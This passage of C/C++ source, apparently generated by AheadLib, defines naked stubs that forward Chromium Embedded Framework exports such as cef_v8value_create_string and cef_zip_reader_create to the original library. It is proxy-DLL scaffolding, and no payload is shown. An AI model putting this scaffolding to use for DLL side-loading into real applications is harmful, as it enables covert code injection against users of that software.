	__asm jmp pfnAheadLibEx_cef_trace_event_async_step_into;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_async_step_past(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_async_step_past;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_begin(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_begin;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_end(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_end;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_trace_event_instant(void)
{
	__asm jmp pfnAheadLibEx_cef_trace_event_instant;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_translator_test_create(void)
{
	__asm jmp pfnAheadLibEx_cef_translator_test_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_translator_test_object_child_child_create(void)
{
	__asm jmp pfnAheadLibEx_cef_translator_test_object_child_child_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_translator_test_object_child_create(void)
{
	__asm jmp pfnAheadLibEx_cef_translator_test_object_child_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_translator_test_object_create(void)
{
	__asm jmp pfnAheadLibEx_cef_translator_test_object_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_unregister_internal_web_plugin(void)
{
	__asm jmp pfnAheadLibEx_cef_unregister_internal_web_plugin;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_uridecode(void)
{
	__asm jmp pfnAheadLibEx_cef_uridecode;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_uriencode(void)
{
	__asm jmp pfnAheadLibEx_cef_uriencode;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_urlrequest_create(void)
{
	__asm jmp pfnAheadLibEx_cef_urlrequest_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8context_get_current_context(void)
{
	__asm jmp pfnAheadLibEx_cef_v8context_get_current_context;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8context_get_entered_context(void)
{
	__asm jmp pfnAheadLibEx_cef_v8context_get_entered_context;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8context_in_context(void)
{
	__asm jmp pfnAheadLibEx_cef_v8context_in_context;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8stack_trace_get_current(void)
{
	__asm jmp pfnAheadLibEx_cef_v8stack_trace_get_current;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_array(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_array;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_bool(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_bool;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_date(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_date;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_double(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_double;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_function(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_function;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_int(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_int;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_null(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_null;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_object(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_object;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_string(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_string;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_uint(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_uint;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_v8value_create_undefined(void)
{
	__asm jmp pfnAheadLibEx_cef_v8value_create_undefined;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_value_create(void)
{
	__asm jmp pfnAheadLibEx_cef_value_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_version_info(void)
{
	__asm jmp pfnAheadLibEx_cef_version_info;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_visit_web_plugin_info(void)
{
	__asm jmp pfnAheadLibEx_cef_visit_web_plugin_info;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_window_create_top_level(void)
{
	__asm jmp pfnAheadLibEx_cef_window_create_top_level;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_write_json(void)
{
	__asm jmp pfnAheadLibEx_cef_write_json;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_xml_reader_create(void)
{
	__asm jmp pfnAheadLibEx_cef_xml_reader_create;
}

EXTERN_C __declspec(naked) void __cdecl AheadLibEx_cef_zip_reader_create(void)
{
	__asm jmp pfnAheadLibEx_cef_zip_reader_create;
}

